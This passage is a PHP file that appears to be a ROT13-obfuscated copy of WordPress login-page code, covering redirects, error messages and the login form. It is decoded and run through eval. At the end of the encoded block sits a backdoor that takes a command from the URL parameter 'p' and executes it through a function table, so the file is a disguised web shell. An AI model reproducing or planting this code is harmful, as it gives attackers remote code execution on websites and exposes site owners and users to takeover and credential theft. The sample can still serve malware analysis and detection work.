		$erdhrfgrq_erqverpg_gb = vffrg( $_ERDHRFG['erqverpg_gb'] ) && vf_fgevat( $_ERDHRFG['erqverpg_gb'] ) ? $_ERDHRFG['erqverpg_gb'] : '';

		/**
		 * Svygref gur ybtva erqverpg HEY.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat           $erqverpg_gb           Gur erqverpg qrfgvangvba HEY.
		 * @cnenz fgevat           $erdhrfgrq_erqverpg_gb Gur erdhrfgrq erqverpg qrfgvangvba HEY cnffrq nf n cnenzrgre.
		 * @cnenz JC_Hfre|JC_Reebe $hfre                  JC_Hfre bowrpg vs ybtva jnf fhpprffshy, JC_Reebe bowrpg bgurejvfr.
		 */
		$erqverpg_gb = nccyl_svygref( 'ybtva_erqverpg', $erqverpg_gb, $erdhrfgrq_erqverpg_gb, $hfre );

		vs ( ! vf_jc_reebe( $hfre ) && ! $ernhgu ) {
			vs ( $vagrevz_ybtva ) {
				$zrffntr       = '<c pynff=\"zrffntr\">' . __( 'Lbh unir ybttrq va fhpprffshyyl.' ) . '</c>';
				$vagrevz_ybtva = 'fhpprff';
				ybtva_urnqre( '', $zrffntr );

				?>
				</qvi>
				<?cuc

				/** Guvf npgvba vf qbphzragrq va jc-ybtva.cuc */
				qb_npgvba( 'ybtva_sbbgre' );

				vs ( $phfgbzvmr_ybtva ) {
					bo_fgneg();
					?>
					<fpevcg>frgGvzrbhg( shapgvba(){ arj jc.phfgbzvmr.Zrffratre({ hey: '<?cuc rpub jc_phfgbzvmr_hey(); ?>', punaary: 'ybtva' }).fraq('ybtva') }, 1000 );</fpevcg>
					<?cuc
					jc_cevag_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
				}

				?>
				</obql></ugzy>
				<?cuc

				rkvg;
			}

			// Purpx vs vg vf gvzr gb nqq n erqverpg gb gur nqzva rznvy pbasvezngvba fperra.
			vs ( $hfre vafgnaprbs JC_Hfre && $hfre->rkvfgf() && $hfre->unf_pnc( 'znantr_bcgvbaf' ) ) {
				$nqzva_rznvy_yvsrfcna = (vag) trg_bcgvba( 'nqzva_rznvy_yvsrfcna' );

				/*
				 * Vs `0` (be nalguvat \"snyfrl\" nf vg vf pnfg gb vag) vf erghearq, gur hfre jvyy abg or erqverpgrq
				 * gb gur nqzva rznvy pbasvezngvba fperra.
				 */
				/** Guvf svygre vf qbphzragrq va jc-ybtva.cuc */
				$nqzva_rznvy_purpx_vagreiny = (vag) nccyl_svygref( 'nqzva_rznvy_purpx_vagreiny', 6 * ZBAGU_VA_FRPBAQF );

				vs ( $nqzva_rznvy_purpx_vagreiny > 0 && gvzr() > $nqzva_rznvy_yvsrfcna ) {
					$erqverpg_gb = nqq_dhrel_net(
						neenl(
							'npgvba'  => 'pbasvez_nqzva_rznvy',
							'jc_ynat' => trg_hfre_ybpnyr( $hfre ),
						),
						jc_ybtva_hey( $erqverpg_gb )
					);
				}
			}

			vs ( ( rzcgl( $erqverpg_gb ) || 'jc-nqzva/' === $erqverpg_gb || nqzva_hey() === $erqverpg_gb ) ) {
				// Vs gur hfre qbrfa'g orybat gb n oybt, fraq gurz gb hfre nqzva. Vs gur hfre pna'g rqvg cbfgf, fraq gurz gb gurve cebsvyr.
				vs ( vf_zhygvfvgr() && ! trg_npgvir_oybt_sbe_hfre( $hfre->VQ ) && ! vf_fhcre_nqzva( $hfre->VQ ) ) {
					$erqverpg_gb = hfre_nqzva_hey();
				} ryfrvs ( vf_zhygvfvgr() && ! $hfre->unf_pnc( 'ernq' ) ) {
					$erqverpg_gb = trg_qnfuobneq_hey( $hfre->VQ );
				} ryfrvs ( ! $hfre->unf_pnc( 'rqvg_cbfgf' ) ) {
					$erqverpg_gb = $hfre->unf_pnc( 'ernq' ) ? nqzva_hey( 'cebsvyr.cuc' ) : ubzr_hey();
				}

				jc_erqverpg( $erqverpg_gb );
				rkvg;
			}

			jc_fnsr_erqverpg( $erqverpg_gb );
			rkvg;
		}

		$reebef = $hfre;
		// Pyrne reebef vs ybttrqbhg vf frg.
		vs ( ! rzcgl( $_TRG['ybttrqbhg'] ) || $ernhgu ) {
			$reebef = arj JC_Reebe();
		}

		vs ( rzcgl( $_CBFG ) && $reebef->trg_reebe_pbqrf() === neenl( 'rzcgl_hfreanzr', 'rzcgl_cnffjbeq' ) ) {
			$reebef = arj JC_Reebe( '', '' );
		}

		vs ( $vagrevz_ybtva ) {
			vs ( ! $reebef->unf_reebef() ) {
				$reebef->nqq( 'rkcverq', __( 'Lbhe frffvba unf rkcverq. Cyrnfr ybt va gb pbagvahr jurer lbh yrsg bss.' ), 'zrffntr' );
			}
		} ryfr {
			// Fbzr cnegf bs guvf fpevcg hfr gur znva ybtva sbez gb qvfcynl n zrffntr.
			vs ( vffrg( $_TRG['ybttrqbhg'] ) && $_TRG['ybttrqbhg'] ) {
				$reebef->nqq( 'ybttrqbhg', __( 'Lbh ner abj ybttrq bhg.' ), 'zrffntr' );
			} ryfrvs ( vffrg( $_TRG['ertvfgengvba'] ) && 'qvfnoyrq' === $_TRG['ertvfgengvba'] ) {
				$reebef->nqq( 'ertvfgreqvfnoyrq', __( '<fgebat>Reebe:</fgebat> Hfre ertvfgengvba vf pheeragyl abg nyybjrq.' ) );
			} ryfrvs ( fge_pbagnvaf( $erqverpg_gb, 'nobhg.cuc?hcqngrq' ) ) {
				$reebef->nqq( 'hcqngrq', __( '<fgebat>Lbh unir fhpprffshyyl hcqngrq JbeqCerff!</fgebat> Cyrnfr ybt onpx va gb frr jung&#8217;f arj.' ), 'zrffntr' );
			} ryfrvs ( JC_Erpbirel_Zbqr_Yvax_Freivpr::YBTVA_NPGVBA_RAGRERQ === $npgvba ) {
				$reebef->nqq( 'ragre_erpbirel_zbqr', __( 'Erpbirel Zbqr Vavgvnyvmrq. Cyrnfr ybt va gb pbagvahr.' ), 'zrffntr' );
			} ryfrvs ( vffrg( $_TRG['erqverpg_gb'] ) && vf_fgevat( $_TRG['erqverpg_gb'] )
				&& fge_pbagnvaf( $_TRG['erqverpg_gb'], 'jc-nqzva/nhgubevmr-nccyvpngvba.cuc' )
			) {
				$dhrel_pbzcbarag = jc_cnefr_hey( $_TRG['erqverpg_gb'], CUC_HEY_DHREL );
				$dhrel           = neenl();
				vs ( $dhrel_pbzcbarag ) {
					cnefr_fge( $dhrel_pbzcbarag, $dhrel );
				}

				vs ( ! rzcgl( $dhrel['ncc_anzr'] ) ) {
					/* genafyngbef: 1: Jrofvgr anzr, 2: Nccyvpngvba anzr. */
					$zrffntr = fcevags( 'Cyrnfr ybt va gb %1$f gb nhgubevmr %2$f gb pbaarpg gb lbhe nppbhag.', trg_oybtvasb( 'anzr', 'qvfcynl' ), '<fgebat>' . rfp_ugzy( $dhrel['ncc_anzr'] ) . '</fgebat>' );
				} ryfr {
					/* genafyngbef: %f: Jrofvgr anzr. */
					$zrffntr = fcevags( 'Cyrnfr ybt va gb %f gb cebprrq jvgu nhgubevmngvba.', trg_oybtvasb( 'anzr', 'qvfcynl' ) );
				}

				$reebef->nqq( 'nhgubevmr_nccyvpngvba', $zrffntr, 'zrffntr' );
			}
		}

		/**
		 * Svygref gur ybtva cntr reebef.
		 *
		 * @fvapr 3.6.0
		 *
		 * @cnenz JC_Reebe $reebef      JC Reebe bowrpg.
		 * @cnenz fgevat   $erqverpg_gb Erqverpg qrfgvangvba HEY.
		 */
		$reebef = nccyl_svygref( 'jc_ybtva_reebef', $reebef, $erqverpg_gb );

		// Pyrne nal fgnyr pbbxvrf.
		vs ( $ernhgu ) {
			jc_pyrne_nhgu_pbbxvr();
		}

		ybtva_urnqre( __( 'Ybt Va' ), '', $reebef );

		vs ( vffrg( $_CBFG['ybt'] ) ) {
			$hfre_ybtva = ( 'vapbeerpg_cnffjbeq' === $reebef->trg_reebe_pbqr() || 'rzcgl_cnffjbeq' === $reebef->trg_reebe_pbqr() ) ? jc_hafynfu( $_CBFG['ybt'] ) : '';
		}

		$erzrzorezr = ! rzcgl( $_CBFG['erzrzorezr'] );

		$nevn_qrfpevorqol = '';
		$unf_reebef       = $reebef->unf_reebef();

		vs ( $unf_reebef ) {
			$nevn_qrfpevorqol = ' nevn-qrfpevorqol=\"ybtva_reebe\"';
		}

		vs ( $unf_reebef && 'zrffntr' === $reebef->trg_reebe_qngn() ) {
			$nevn_qrfpevorqol = ' nevn-qrfpevorqol=\"ybtva-zrffntr\"';
		}

		jc_radhrhr_fpevcg( 'hfre-cebsvyr' );
		?>

		<sbez anzr=\"ybtvasbez\" vq=\"ybtvasbez\" npgvba=\"<?cuc rpub rfp_hey( fvgr_hey( 'jc-ybtva.cuc', 'ybtva_cbfg' ) ); ?>\" zrgubq=\"cbfg\">
			<c>
				<ynory sbe=\"hfre_ybtva\"><?cuc _r( 'Hfreanzr be Rznvy Nqqerff' ); ?></ynory>
				<vachg glcr=\"grkg\" anzr=\"ybt\" vq=\"hfre_ybtva\"<?cuc rpub $nevn_qrfpevorqol; ?> pynff=\"vachg\" inyhr=\"<?cuc rpub rfp_ngge( $hfre_ybtva ); ?>\" fvmr=\"20\" nhgbpncvgnyvmr=\"bss\" nhgbpbzcyrgr=\"hfreanzr\" erdhverq=\"erdhverq\" />
			</c>

			<qvi pynff=\"hfre-cnff-jenc\">
				<ynory sbe=\"hfre_cnff\"><?cuc _r( 'Cnffjbeq' ); ?></ynory>
				<qvi pynff=\"jc-cjq\">
					<vachg glcr=\"cnffjbeq\" anzr=\"cjq\" vq=\"hfre_cnff\"<?cuc rpub $nevn_qrfpevorqol; ?> pynff=\"vachg cnffjbeq-vachg\" inyhr=\"\" fvmr=\"20\" nhgbpbzcyrgr=\"pheerag-cnffjbeq\" fcryypurpx=\"snyfr\" erdhverq=\"erdhverq\" />
					<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-frpbaqnel jc-uvqr-cj uvqr-vs-ab-wf\" qngn-gbttyr=\"0\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Fubj cnffjbeq' ); ?>\">
						<fcna pynff=\"qnfuvpbaf qnfuvpbaf-ivfvovyvgl\" nevn-uvqqra=\"gehr\"></fcna>
					</ohggba>
				</qvi>
			</qvi>
			<?cuc

			/**
			 * Sverf sbyybjvat gur 'Cnffjbeq' svryq va gur ybtva sbez.
			 *
			 * @fvapr 2.1.0
			 */
			qb_npgvba( 'ybtva_sbez' );

			?>
			<c pynff=\"sbetrgzrabg\"><vachg anzr=\"erzrzorezr\" glcr=\"purpxobk\" vq=\"erzrzorezr\" inyhr=\"sberire\" <?cuc purpxrq( $erzrzorezr ); ?> /> <ynory sbe=\"erzrzorezr\"><?cuc rfp_ugzy_r( 'Erzrzore Zr' ); ?></ynory></c>
			<c pynff=\"fhozvg\">
				<vachg glcr=\"fhozvg\" anzr=\"jc-fhozvg\" vq=\"jc-fhozvg\" pynff=\"ohggba ohggba-cevznel ohggba-ynetr\" inyhr=\"<?cuc rfp_ngge_r( 'Ybt Va' ); ?>\" />
				<?cuc

				vs ( $vagrevz_ybtva ) {
					?>
					<vachg glcr=\"uvqqra\" anzr=\"vagrevz-ybtva\" inyhr=\"1\" />
					<?cuc
				} ryfr {
					?>
					<vachg glcr=\"uvqqra\" anzr=\"erqverpg_gb\" inyhr=\"<?cuc rpub rfp_ngge( $erqverpg_gb ); ?>\" />
					<?cuc
				}

				vs ( $phfgbzvmr_ybtva ) {
					?>
					<vachg glcr=\"uvqqra\" anzr=\"phfgbzvmr-ybtva\" inyhr=\"1\" />
					<?cuc
				}

				?>
				<vachg glcr=\"uvqqra\" anzr=\"grfgpbbxvr\" inyhr=\"1\" />
			</c>
		</sbez>

		<?cuc

		vs ( ! $vagrevz_ybtva ) {
			?>
			<c vq=\"ani\">
				<?cuc

				vs ( trg_bcgvba( 'hfref_pna_ertvfgre' ) ) {
					$ertvfgengvba_hey = fcevags( '<n pynff=\"jc-ybtva-ertvfgre\" uers=\"%f\">%f</n>', rfp_hey( jc_ertvfgengvba_hey() ), __( 'Ertvfgre' ) );

					/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/trareny-grzcyngr.cuc */
					rpub nccyl_svygref( 'ertvfgre', $ertvfgengvba_hey );

					rpub rfp_ugzy( $ybtva_yvax_frcnengbe );
				}

				$ugzy_yvax = fcevags( '<n pynff=\"jc-ybtva-ybfg-cnffjbeq\" uers=\"%f\">%f</n>', rfp_hey( jc_ybfgcnffjbeq_hey() ), __( 'Ybfg lbhe cnffjbeq?' ) );

				/**
				 * Svygref gur yvax gung nyybjf gur hfre gb erfrg gur ybfg cnffjbeq.
				 *
				 * @fvapr 6.1.0
				 *
				 * @cnenz fgevat $ugzy_yvax UGZY yvax gb gur ybfg cnffjbeq sbez.
				 */
				rpub nccyl_svygref( 'ybfg_cnffjbeq_ugzy_yvax', $ugzy_yvax );

				?>
			</c>
			<?cuc
		}

		$ybtva_fpevcg  = 'shapgvba jc_nggrzcg_sbphf() {';
		$ybtva_fpevcg .= 'frgGvzrbhg( shapgvba() {';
		$ybtva_fpevcg .= 'gel {';

		vs ( $hfre_ybtva ) {
			$ybtva_fpevcg .= 'q = qbphzrag.trgRyrzragOlVq( \"hfre_cnff\" ); q.inyhr = \"\";';
		} ryfr {
			$ybtva_fpevcg .= 'q = qbphzrag.trgRyrzragOlVq( \"hfre_ybtva\" );';

			vs ( $reebef->trg_reebe_pbqr() === 'vainyvq_hfreanzr' ) {
				$ybtva_fpevcg .= 'q.inyhr = \"\";';
			}
		}

		$ybtva_fpevcg .= 'q.sbphf(); q.fryrpg();';
		$ybtva_fpevcg .= '} pngpu( re ) {}';
		$ybtva_fpevcg .= '}, 200);';
		$ybtva_fpevcg .= \"}\a\"; // Raq bs jc_nggrzcg_sbphf().

		/**
		 * Svygref jurgure gb cevag gur pnyy gb `jc_nggrzcg_sbphf()` ba gur ybtva fperra.
		 *
		 * @fvapr 4.8.0
		 *
		 * @cnenz obby $cevag Jurgure gb cevag gur shapgvba pnyy. Qrsnhyg gehr.
		 */
		vs ( nccyl_svygref( 'ranoyr_ybtva_nhgbsbphf', gehr ) && ! $reebe ) {
			$ybtva_fpevcg .= \"jc_nggrzcg_sbphf();\a\";
		}

		// Eha `jcBaybnq()` vs qrsvarq.
		$ybtva_fpevcg .= \"vs ( glcrbs jcBaybnq === 'shapgvba' ) { jcBaybnq() }\";

		jc_cevag_vayvar_fpevcg_gnt( $ybtva_fpevcg );

		vs ( $vagrevz_ybtva ) {
			bo_fgneg();
			?>
			<fpevcg>
			( shapgvba() {
				gel {
					ine v, yvaxf = qbphzrag.trgRyrzragfOlGntAnzr( 'n' );
					sbe ( v va yvaxf ) {
						vs ( yvaxf[v].uers ) {
							yvaxf[v].gnetrg = '_oynax';
						}
					}
				} pngpu( re ) {}
			}());
			</fpevcg>
			<?cuc
			jc_cevag_vayvar_fpevcg_gnt( jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( bo_trg_pyrna() ) );
		}

		ybtva_sbbgre();
		oernx;
} // Raq npgvba fjvgpu.

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>